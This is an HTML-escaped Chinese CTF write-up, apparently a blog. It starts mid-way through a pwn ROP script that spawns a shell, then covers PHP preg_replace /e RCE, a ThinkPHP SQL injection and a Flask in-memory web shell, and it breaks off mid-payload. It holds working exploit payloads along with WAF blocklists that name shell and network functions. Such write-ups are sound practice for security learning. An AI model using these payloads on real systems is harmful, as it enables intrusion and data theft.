class=&#34;string&#34;&gt;&amp;#x27;E&amp;#x27;&lt;/span&gt; * &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;x50 + b&lt;span class=&#34;string&#34;&gt;&amp;#x27;F&amp;#x27;&lt;/span&gt; *&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt; + rop&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# gdb.attach(io, gdbscript=&amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# b *0x0000000004A0A88&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# c&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# stack 60&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#     &amp;#x27;&amp;#x27;&amp;#x27;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# pause()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.sendline(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;sleep&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0.6&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.sendline(b&lt;span class=&#34;string&#34;&gt;&amp;#x27;/bin/sh\x00&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;sleep&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0.6&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.sendline(b&lt;span class=&#34;string&#34;&gt;&amp;#x27;cat flag&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;crypto&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#crypto&#34;&gt;#&lt;/a&gt; Crypto&lt;/h2&gt;
&lt;h3 id=&#34;古密&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#古密&#34;&gt;#&lt;/a&gt; 古密&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://img-blog.csdnimg.cn/img_convert/b613dd50168ba85408ec13bb18e31088.png&#34; alt=&#34;image.png&#34;&gt;&lt;br&gt;
&lt;img src=&#34;https://img-blog.csdnimg.cn/img_convert/f08d9bb9ada5a3e235f039b29aca61af.png&#34; alt=&#34;image.png&#34;&gt;&lt;br&gt;
&lt;img src=&#34;https://img-blog.csdnimg.cn/img_convert/39b72b7f9a576909c5c70e045b06bf68.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;

 &lt;h1 id=&#34;web&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#web&#34;&gt;#&lt;/a&gt; Web&lt;/h1&gt;
&lt;h2 id=&#34;please_rce_me&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#please_rce_me&#34;&gt;#&lt;/a&gt; Please_RCE_Me&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://img-blog.csdnimg.cn/img_convert/32f566d418dc4544b9e20d8d13411b66.png&#34; alt=&#34;Screenshot 2024-05-12 131227.png&#34;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;	GET传参输入?moran=flag，之后获取源码：
&lt;/code&gt;&lt;/pre&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;moran&amp;#x27;&lt;/span&gt;] === &lt;span class=&#34;string&#34;&gt;&amp;#x27;flag&amp;#x27;&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;title function_ invoke__&#34;&gt;highlight_file&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;__FILE__&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;task&amp;#x27;&lt;/span&gt;])&amp;amp;&amp;amp;&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;flag&amp;#x27;&lt;/span&gt;]))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$str1&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;task&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$str2&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;flag&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;preg_match&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;/system|eval|assert|call|create|preg|sort|&amp;#123;|&amp;#125;|filter|exec|passthru|proc|open|echo|`| |\.|include|require|flag/i&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$str1&lt;/span&gt;) || &lt;span class=&#34;title function_ invoke__&#34;&gt;strlen&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$str2&lt;/span&gt;) != &lt;span class=&#34;number&#34;&gt;19&lt;/span&gt; || &lt;span class=&#34;title function_ invoke__&#34;&gt;preg_match&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;/please_give_me_flag/&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$str2&lt;/span&gt;))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;die&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;hacker!&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;title function_ invoke__&#34;&gt;preg_replace&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;/please_give_me_flag/ei&amp;quot;&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;task&amp;#x27;&lt;/span&gt;],&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;flag&amp;#x27;&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;moran want a flag.&amp;lt;/br&amp;gt;(?moran=flag)&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;pre&gt;&lt;code&gt;	这个是RCE吗？

	审一审。成功找到了漏洞点，preg_replace(&amp;quot;/please_give_me_flag/ei&amp;quot;,![](https://www.yuque.com/api/services/graph/generate_redirect/latex?_POST%5B&#39;task&#39;%5D%2C#card=math&amp;amp;code=_POST%5B%27task%27%5D%2C&amp;amp;id=o3Kvv)_POST[&#39;flag&#39;]);可以看到，存在/e模式，再看看PHP版本，5.6.40，可能存在/e的命令执行漏洞。

	前面，需要绕的Waf第一个为：
&lt;/code&gt;&lt;/pre&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;preg_match(&amp;#x27;/system|eval|assert|call|create|preg|sort|&amp;#123;|&amp;#125;|filter|exec|passthru|proc|open|echo|`| |.|include|require|flag/i&amp;#x27;,$str1)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;pre&gt;&lt;code&gt;	这个绕过先放放，看看后面两个：
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;strlen(str2) != 19 || preg_match(’/please_give_me_flag/’,str2)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code&gt;	因为都是逻辑或，所以得让他们都为False，刚好，please_give_me_flag 长度为19，第二个正则刚好是大小写敏感，所以大小写混合绕过。

	然后就是补充下关于/e模式的问题：
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;preg_replace 使用了 /e 模式，导致可以代码执行，而且该函数的第一个和第三个参数都是我们可以控制的。我们都知道， preg_replace 函数在匹配到符号正则的字符串时，会将替换字符串（也就是上图 preg_replace 函数的第二个参数）当做代码来执行&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code&gt;	最后尝试下phpinfo：
&lt;/code&gt;&lt;/pre&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;//POST传参&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;flag=Please_give_me_flag&amp;amp;task=phpinfo()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;https://img-blog.csdnimg.cn/img_convert/5360c207b3d310e77b32d9bc41be09d4.png&#34; alt=&#34;Screenshot 2024-05-12 132313.png&#34;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;	成功打出组合拳。

	再回头看看第一个过滤，看上去几乎把所有的shell函数都过滤了。推测flag在根目录，那么学着使用无参数RCE的方式打这套组合拳，payload如下：
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;flag=Please_give_me_flag&amp;amp;task=chdir(&amp;quot;/&amp;quot;)|highlight_file(scandir(pos(localeconv()))[7])&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;最后得到 flag&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://img-blog.csdnimg.cn/img_convert/c6799817df231c2c29d719c55eb21a19.png&#34; alt=&#34;Screenshot 2024-05-12 132839.png&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;ez_tp复现&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ez_tp复现&#34;&gt;#&lt;/a&gt; ez_tp（复现）&lt;/h2&gt;
&lt;p&gt;看起来像是 thinkphp 的题，不过，是非预期的题，用平常的 payload 一把梭怕是不对，所以，还能怎么搞？下在附件下来审审吧。&lt;br&gt;
在附件 /ez_tp/App/Home/Controller 中存在 IndexController.class.php 文件，打开看看：&lt;br&gt;
这应该是一个路由吧：&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;public function h_n()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;路由应该是 h_n，那么，应该怎么打呢？不知道为啥，复现的时候日志找不到了，看 dalao 们的 wp 的时候，都说的是根据后台的日志有 payload，但是现在跑去找又找不到了。&lt;br&gt;
继续往后面审计，发现了如下代码&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$name = I(&lt;span class=&#34;string&#34;&gt;&amp;#x27;GET.name&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;好，知道了需要通过 get 传参，还是 GET 传参。&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$pattern = &lt;span class=&#34;string&#34;&gt;&amp;quot;insert|update|delete|and|or|\/\*|\*|\.\.\/|\.\/|into|load_file|outfile|dumpfile|sub|hex&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            $pattern.= &lt;span class=&#34;string&#34;&gt;&amp;quot;|file_put_contents|fwrite|curl|system|eval|assert&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            $pattern.= &lt;span class=&#34;string&#34;&gt;&amp;quot;|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            $pattern.= &lt;span class=&#34;string&#34;&gt;&amp;quot;|`|dl|openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|assert|pcntl_exec&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            $vpattern = explode(&lt;span class=&#34;string&#34;&gt;&amp;quot;|&amp;quot;&lt;/span&gt;, $pattern);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            $&lt;span class=&#34;built_in&#34;&gt;bool&lt;/span&gt; = false;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            foreach ($&lt;span class=&#34;built_in&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;as&lt;/span&gt; $k =&amp;gt; $v) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                foreach ($vpattern &lt;span class=&#34;keyword&#34;&gt;as&lt;/span&gt; $value) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    foreach ($v &lt;span class=&#34;keyword&#34;&gt;as&lt;/span&gt; $kk =&amp;gt; $vv) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (preg_match(&lt;span class=&#34;string&#34;&gt;&amp;quot;/$value/i&amp;quot;&lt;/span&gt;, $vv)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                            $&lt;span class=&#34;built_in&#34;&gt;bool&lt;/span&gt; = true;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                            &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ($&lt;span class=&#34;built_in&#34;&gt;bool&lt;/span&gt;) &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ($&lt;span class=&#34;built_in&#34;&gt;bool&lt;/span&gt;) &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; $&lt;span class=&#34;built_in&#34;&gt;bool&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这里大概审一下就是，检测所有的键值对中，是否存在黑名单字段，所以，我们传入的参数键值对都不能出现黑名单字段，因此，文件包含和 RCE 没法打，再看看下面的这段代码：&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (waf())&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            $this-&amp;gt;index();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            $ret = $User-&amp;gt;field(&lt;span class=&#34;string&#34;&gt;&amp;#x27;username,age&amp;#x27;&lt;/span&gt;)-&amp;gt;where(array(&lt;span class=&#34;string&#34;&gt;&amp;#x27;username&amp;#x27;&lt;/span&gt;=&amp;gt;$name))-&amp;gt;select();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            echo var_export($ret, true);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;猜测应该这儿应该有个 sql 注入存在，并且没有过滤 select，所以，根据 thinkphp 的以前的 payload，以及大佬的 wp 中说的日志中的信息，可以得知 payload 为：&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;/index.php/home/index/h_n？name[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]=exp&amp;amp;name[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]=%3d%27test123%&lt;span class=&#34;number&#34;&gt;27&lt;/span&gt;%20union%20select%&lt;span class=&#34;number&#34;&gt;201&lt;/span&gt;,flag%&lt;span class=&#34;number&#34;&gt;20&lt;/span&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt;%20flag&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;最后得到了 flag： array (0 =&amp;gt; array ( ‘username’ =&amp;gt; ‘1’, ‘age’ =&amp;gt; ‘H&amp;amp;NCTF {Cjp_6c3114ee-23e1-459b-ad88-9b29ccfde934}’, ), )&lt;/p&gt;
&lt;h2 id=&#34;ezflask复现&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ezflask复现&#34;&gt;#&lt;/a&gt; ezFlask（复现）&lt;/h2&gt;
&lt;p&gt;题目没出 flask，但是好在了解了一个新的 flask 的 ssti 的姿势，记录在这儿，不知道为啥，跟着 wp 复现，却还是失败了，先记录吧，之后再改。&lt;br&gt;
首先，打开网页就给了个提示：&lt;/p&gt;
&lt;div class=&#34;note info&#34;&gt;
&lt;p&gt;冒险即将开始！！！ 请移步 / Adventure 路由进行命令执行，后端语句为： cmd = request.form [‘cmd’] eval (cmd) 注意，你仅有一次机会，在进行唯一一次成功的命令执行后生成 flag 并写入 /flag 执行无回显，目录没权限部分命令 ban，也不要想着写文件～&lt;/p&gt;
&lt;/div&gt;
&lt;h3 id=&#34;失败情况&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#失败情况&#34;&gt;#&lt;/a&gt; 失败情况：&lt;/h3&gt;
&lt;p&gt;大概跟他提示的一样，就是一个命令执行，不过没思路，很可惜，看了下 wp，说的是写入内存马到一个路由里，但是我复现却失败了，不知是为何，他给的内存马的 payload 能成功写入，并且能访问到写入的路由，但是，却会报 500 错误，不知是为何，等官方 wp 出了再看看是为啥吧，payload 先写在下面。&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;cmd=render_template_string(&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;#123;&amp;#123;url_for.__globals__[&amp;#x27;__builtins__&amp;#x27;][&amp;#x27;eval&amp;#x27;](\&amp;quot;app.add_url_rule(&amp;#x27;/shell&amp;#x27;, &amp;#x27;myshell&amp;#x27;, lambda :__import__(&amp;#x27;os&amp;#x27;).popen(_request_ctx_stack.top.request.args.get(&amp;#x27;cmd&amp;#x27;)).read())\&amp;quot;,&amp;#123;&amp;#x27;_request_ctx_stack&amp;#x27;:url_for.__globals__[&amp;#x27;_request_ctx_stack&amp;#x27;],&amp;#x27;app&amp;#x27;:url_for.__globals__[&amp;#x27;current_app&amp;#x27;]&amp;#125;)&amp;#125;&amp;#125;&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;成功情况&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#成功情况&#34;&gt;#&lt;/a&gt; 成功情况：&lt;/h3&gt;
&lt;p&gt;找到了另一个 payload，同样是内存马，payload 如下：&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;cmd=app.add_url_rule(&lt;span class=&#34;string&#34;&gt;&amp;#x27;/test&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;test&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt;:&lt;span class=&#34;built_in&#34;&gt;__import__&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;os&amp;#x27;&lt;/span&gt;).popen(request.args.get(&lt;span 